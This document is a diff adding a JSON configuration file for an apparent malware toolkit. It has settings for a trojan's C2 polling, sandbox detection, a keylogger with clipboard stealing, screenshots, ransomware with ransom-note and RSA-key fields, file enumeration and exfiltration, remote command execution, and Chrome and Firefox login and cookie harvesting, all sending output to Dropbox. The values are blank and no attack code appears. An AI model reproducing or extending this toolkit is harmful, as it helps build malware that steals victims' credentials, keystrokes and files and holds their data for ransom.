@@ -1,0 +1,80 @@
+{
+	"Trojan": {
+		"c2_domain": "",
+		"c2_poll_interval_ms": 5000,
+		"c2_ping_interval_ms": 1000,
+		"command_max_age_ms": 5000
+	},
+	"SandboxDetector": {},
+	"DropboxKeylogger": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"max_runtime_ms": 60000,
+		"window_check_interval_ms": 1000,
+		"exfiltration_interval_ms": 5000,
+		"exfiltration_max_threads": 4,
+		"exfiltration_retry_if_fail": true,
+		"enable_clipboard_stealer": true
+	},
+	"DropboxScreenshotter": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"max_runtime_ms": 20000,
+		"screenshot_interval_ms": 2000,
+		"image_format": "JPEG"
+	},
+	"DropboxRansomware": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"output_json_indent_level": 4,
+		"root_dirpath": "",
+		"target_file_extensions": [],
+		"email_address": "",
+		"decryptor_source_url": "",
+		"decryptor_download_filepath": "",
+		"b64_str_init_vector": "",
+		"b64_str_rsa_pubkey": "",
+		"ransom_message": "",
+		"ransom_message_filepath": ""
+	},
+	"DropboxFileExfiltrator": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"root_dirpath": "",
+		"target_file_extensions": [],
+		"target_filepaths": [],
+		"target_dirpaths": [],
+		"output_zip_dirpath": ""
+	},
+	"DropboxFileEnumerator": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"output_json_indent_level": 4,
+		"root_dirpath": "",
+		"target_file_extensions": [],
+		"enumerate_all": false
+	},
+	"DropboxCMDExecutor": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"command": ""
+	},
+	"DropboxChromeLoginHarvester": {
+		"dropbox_token": "",
+		"output_dropbox_dirpath": "",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": ""	
+	},
+	"DropboxChromeCookieHarvester": {
+		"dropbox_token": "",
+	    "output_dropbox_dirpath": "",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": ""
+	},
+	"DropboxFirefoxCookieHarvester": {
+		"dropbox_token": "",
+	    "output_dropbox_dirpath": "",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": ""	
+	}
+}
